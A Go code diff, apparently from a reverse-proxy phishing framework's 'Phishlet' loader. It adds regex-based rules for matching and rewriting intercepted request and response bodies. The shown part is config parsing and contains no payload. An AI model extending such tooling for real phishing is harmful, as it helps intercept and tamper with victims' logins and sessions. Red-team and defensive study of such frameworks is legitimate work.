@@ -97,15 +97,25 @@ type JsInject struct {
 	script          string           `mapstructure:"script"`
 }
 
+type AlterRule struct {
+	re      *regexp.Regexp
+	replace string
+	expr    string
+}
+
 type Intercept struct {
-	domain      string         `mapstructure:"domain"`
-	path        *regexp.Regexp `mapstructure:"path"`
-	method      string         `mapstructure:"method"`
-	type_       string         `mapstructure:"type"`
-	template    string         `mapstructure:"template"`
-	http_status int            `mapstructure:"http_status"`
-	body        string         `mapstructure:"body"`
-	mime        string         `mapstructure:"mime"`
+	domain        string         `mapstructure:"domain"`
+	path          *regexp.Regexp `mapstructure:"path"`
+	method        string         `mapstructure:"method"`
+	type_         string         `mapstructure:"type"`
+	template      string         `mapstructure:"template"`
+	http_status   int            `mapstructure:"http_status"`
+	body          string         `mapstructure:"body"`
+	mime          string         `mapstructure:"mime"`
+	body_match    *regexp.Regexp `mapstructure:"body_match"`
+	alterRequest  []AlterRule    `mapstructure:"alter_request"`
+	responseMatch *regexp.Regexp `mapstructure:"response_match"`
+	alterResponse []AlterRule    `mapstructure:"alter_response"`
 }
 
 type PathRewrite struct {
@@ -221,14 +231,18 @@ type ConfigJsInject struct {
 }
 
 type ConfigIntercept struct {
-	Domain     *string `mapstructure:"domain"`
-	Path       *string `mapstructure:"path"`
-	Method     *string `mapstructure:"method"`
-	Type       *string `mapstructure:"type"`
-	Template   *string `mapstructure:"template"`
-	HttpStatus *int    `mapstructure:"http_status"`
-	Body       *string `mapstructure:"body"`
-	Mime       *string `mapstructure:"mime"`
+	Domain       *string            `mapstructure:"domain"`
+	Path         *string            `mapstructure:"path"`
+	Method       *string            `mapstructure:"method"`
+	Type         *string            `mapstructure:"type"`
+	Template     *string            `mapstructure:"template"`
+	HttpStatus   *int               `mapstructure:"http_status"`
+	Body         *string            `mapstructure:"body"`
+	Mime         *string            `mapstructure:"mime"`
+	BodyMatch    *string            `mapstructure:"body_match"`
+	AlterRequest map[string]string  `mapstructure:"alter_request"`
+	ResponseMatch *string           `mapstructure:"response_match"`
+	AlterResponse map[string]string `mapstructure:"alter_response"`
 }
 
 type ConfigPathRewrite struct {
@@ -543,7 +557,49 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			err = p.addIntercept(*ic.Domain, path_re, method, type_, template, http_status, body, mime)
+			var bodyMatch *regexp.Regexp
+			if ic.BodyMatch != nil && *ic.BodyMatch != "" {
+				bodyMatch, err = regexp.Compile(*ic.BodyMatch)
+				if err != nil {
+					return fmt.Errorf("intercept: `body_match` invalid regular expression: %v", err)
+				}
+			}
+			var alterRequest []AlterRule
+			if ic.AlterRequest != nil {
+				for reStr, replace := range ic.AlterRequest {
+					re, err := regexp.Compile(reStr)
+					if err != nil {
+						return fmt.Errorf("intercept: `alter_request` invalid regular expression: %v", err)
+					}
+					expr := ""
+					if strings.HasPrefix(replace, "{{") && strings.HasSuffix(replace, "}}") {
+						expr = strings.TrimPrefix(strings.TrimSuffix(replace, "}}"), "{{")
+					}
+					alterRequest = append(alterRequest, AlterRule{re: re, replace: replace, expr: expr})
+				}
+			}
+			var responseMatch *regexp.Regexp
+			if ic.ResponseMatch != nil && *ic.ResponseMatch != "" {
+				responseMatch, err = regexp.Compile(*ic.ResponseMatch)
+				if err != nil {
+					return fmt.Errorf("intercept: `response_match` invalid regular expression: %v", err)
+				}
+			}
+			var alterResponse []AlterRule
+			if ic.AlterResponse != nil {
+				for reStr, replace := range ic.AlterResponse {
+					re, err := regexp.Compile(reStr)
+					if err != nil {
+						return fmt.Errorf("intercept: `alter_response` invalid regular expression: %v", err)
+					}
+					expr := ""
+					if strings.HasPrefix(replace, "{{") && strings.HasSuffix(replace, "}}") {
+						expr = strings.TrimPrefix(strings.TrimSuffix(replace, "}}"), "{{")
+					}
+					alterResponse = append(alterResponse, AlterRule{re: re, replace: replace, expr: expr})
+				}
+			}
+			err = p.addIntercept(*ic.Domain, path_re, method, type_, template, http_status, body, mime, bodyMatch, alterRequest, responseMatch, alterResponse)
 			if err != nil {
 				return err
 			}
@@ -1083,16 +1139,20 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	return nil
 }
 
-func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, method string, type_ string, template string, http_status int, body string, mime string) error {
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, method string, type_ string, template string, http_status int, body string, mime string, body_match *regexp.Regexp, alterRequest []AlterRule, responseMatch *regexp.Regexp, alterResponse []AlterRule) error {
 	ic := Intercept{
-		domain:      strings.ToLower(domain),
-		path:        path,
-		method:      method,
-		type_:       type_,
-		template:    template,
-		http_status: http_status,
-		body:        body,
-		mime:        mime,
+		domain:        strings.ToLower(domain),
+		path:          path,
+		method:        method,
+		type_:         type_,
+		template:      template,
+		http_status:   http_status,
+		body:          body,
+		mime:          mime,
+		body_match:    body_match,
+		alterRequest:  alterRequest,
+		responseMatch: responseMatch,
+		alterResponse: alterResponse,
 	}
 	p.intercept = append(p.intercept, ic)
 	return nil
